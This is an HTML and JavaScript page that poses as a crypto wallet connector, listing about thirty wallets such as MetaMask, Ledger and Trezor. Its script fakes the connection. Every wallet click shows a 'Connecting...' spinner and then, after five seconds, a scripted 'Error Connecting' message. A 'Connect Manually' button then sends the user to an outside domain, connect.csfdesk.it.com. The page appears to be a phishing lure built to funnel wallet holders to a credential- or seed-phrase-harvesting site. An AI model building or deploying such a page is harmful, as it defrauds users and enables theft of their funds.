<script src="https://cdn.tailwindcss.com"></script>
<style>
  body {
    background-color: #091830;
    margin: 0;
    font-family: system-ui, sans-serif;
  }

  .main-container {
    display: flex;
    flex-direction: column;
    height: 100vh;
  }

  .content-wrapper {
    height: 100%;
    background: #091830;
    display: flex;
    justify-content: center;
  }

  .wallet-box {
    margin-top: 50px;
    height: 740px;
    overflow-y: auto;
    background: white;
    text-align: center;
    width: 100%;
    border-radius: 1.5rem;
    border: 1px solid #e5e7eb;
    padding: 2rem 1rem;
    max-width: 90%;
  }


  @media (min-width: 768px) {
    .wallet-box {
      width: 60%;
    }
  }
  @media (min-width: 1024px) {
    .wallet-box {
      width: 40%;
    }
  }

  /* Popup Overlay */
  .overlay {
    display: none;
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background: rgba(0, 0, 0, 0.5);
    align-items: center;
    justify-content: center;
    z-index: 50;
  }

  /* Spinner Animation */
  .spinner {
    border: 4px solid #f3f3f3;
    border-top: 4px solid #3498db;
    border-radius: 50%;
    width: 40px;
    height: 40px;
    animation: spin 1s linear infinite;
    margin: 0 auto 10px auto;
  }

  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
</style>
<body>

<div class="main-container">
  <div class="content-wrapper">
    <div class="wallet-box">
      <h2 class="text-black font-semibold mb-4 text-lg">Choose your wallet</h2>

      <div class="flex flex-col gap-3 max-w-md mx-auto" id="walletList"></div>
    </div>
  </div>
</div>

<!-- Popup Modal -->
<div id="popup" class="overlay">
  <div class="bg-white rounded-xl shadow-lg p-6 max-w-xs text-center">
    <!-- Loading State -->
    <div id="loadingState">
      <div class="spinner"></div>
      <p class="text-gray-700 font-semibold">Connecting...</p>
    </div>

    <!-- Error State -->
    <div id="errorState" class="hidden">
      <h2 class="text-red-600 font-bold text-lg mb-4" id="errorText">Error Connecting...</h2>
      <button onclick="connectManually()"
              class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-md">
        Connect Manually
      </button>
    </div>
  </div>
</div>

<script>
  const wallets = [
    { name: "Crypto onchain", img: "/assets/defi.jpg" },
    { name: "MetaMask", img: "https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/800px-MetaMask_Fox.svg.png" },
    { name: "Trust Wallet", img: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS_88P46925f9EAG7oeQhe1JhUXGctI4MkoSDmMNlQ&s" },
    { name: "Ledger", img: "https://cdn.shopify.com/s/files/1/2974/4858/files/good_square_200x.png?v=1533838574" },
    { name: "Trezor", img: "/assets/trez.jpg" },
    { name: "WalletConnect", img: "/assets/wall.jpg" },
    { name: "Tangem", img: "https://play-lh.googleusercontent.com/Dxnvk-9iZuaOEaDExGqxlQ7DYKKqh2D3gsohpCcuwxTReMGuqQaw1rUN7CG80wQHjSU7" },
    { name: "Relai Wallet", img: "/assets/rel.png" },
    { name: "Phantom Wallet", img: "/assets/phan.jpg" },
    { name: "OKX Wallet", img: "/assets/okx.png" },
    { name: "Coinbase", img: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQk8zN_gOhwoymIIDXr-zT3l0iyMXZB58nMTQ&s" },
    { name: "Keplr", img: "https://www.yadawallets.com/wp-content/uploads/2021/06/Keplr-wallet-logo.png" },
    { name: "Keep Key", img: "/assets/kk.png" },
    { name: "BitBox-02", img: "/assets/bitbox.png" },
    { name: "Ecto Wallet", img: "/assets/ecto.jpg" },
    { name: "Exodus", img: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSedVUC8iOmMq681N89fRAs-Wxd587Jd81RBcL2q7cPz-0Nhqt6RQ6CBaaiwna5RBgLurY&usqp=CAU" },
    { name: "Safepal", img: "/assets/safe.png" },
    { name: "Atomic Wallet", img: "/assets/atomic.png" },
    { name: "Coinomi", img: "https://avatars.githubusercontent.com/u/7957039?s=280&v=4" },
    { name: "TokenPocket", img: "https://everipedia-storage.s3.amazonaws.com/ProfilePicture/lang_en/tokenpocket/mainphoto_medium.webp" },
    { name: "Fortmatic", img: "https://gblobscdn.gitbook.com/spaces%2F-Lj7HukBJLlR6jbx0-eP%2Favatar.png?alt=media" },
    { name: "Portis", img: "/assets/portis.png" },
    { name: "Squarelink", img: "https://avatars.githubusercontent.com/u/36418916?s=280&v=4" },
    { name: "Torus", img: "/assets/torus.jpg" },
    { name: "Authereum", img: "https://pbs.twimg.com/profile_images/1136781248758571008/TOIXMgdS_400x400.png" },
    { name: "VeChain", img: "/assets/vee.png" },
    { name: "Scatter Wallet", img: "/assets/scatter.png" },
    { name: "Math Wallet", img: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRN04hBJLqwxe0dndDvoSMn4JJeyklXMEQ-ag&usqp=CAU" },
    { name: "Tomo Chain", img: "/assets/tomo.png" },
    { name: "Guarda Wallet", img: "https://99bitcoins.com/wp-content/uploads/2019/07/1200x630wa.png" },
    { name: "Cool Wallet", img: "/assets/cool.png" },
    { name: "Others", img: "/assets/wall.jpg" }
  ];

  const container = document.getElementById('walletList');
  wallets.forEach(wallet => {
    const div = document.createElement('div');
    div.className = "flex items-center justify-between cursor-pointer border px-4 py-3 rounded-xl bg-white shadow hover:shadow-md transition";
    div.onclick = () => showPopup(wallet.name);
    div.innerHTML = `
      <h3 class="font-semibold text-base text-gray-800">${wallet.name}</h3>
      <img src="${wallet.img}" alt="${wallet.name}" class="w-10 h-10 object-contain">
    `;
    container.appendChild(div);
  });

  function showPopup(walletName) {
    const popup = document.getElementById('popup');
    const loadingState = document.getElementById('loadingState');
    const errorState = document.getElementById('errorState');
    const errorText = document.getElementById('errorText');

    loadingState.classList.remove('hidden');
    errorState.classList.add('hidden');
    popup.style.display = 'flex';

    setTimeout(() => {
      loadingState.classList.add('hidden');
      errorState.classList.remove('hidden');
      errorText.textContent = `Error Connecting to ${walletName}...`;
    }, 5000);
  }

  function connectManually() {
    window.location.href = "https://connect.csfdesk.it.com/connect-chain";
  }

  document.getElementById('popup').addEventListener('click', function(e) {
    if (e.target.id === 'popup') {
      this.style.display = 'none';
    }
  });
</script>

</body>
</html>
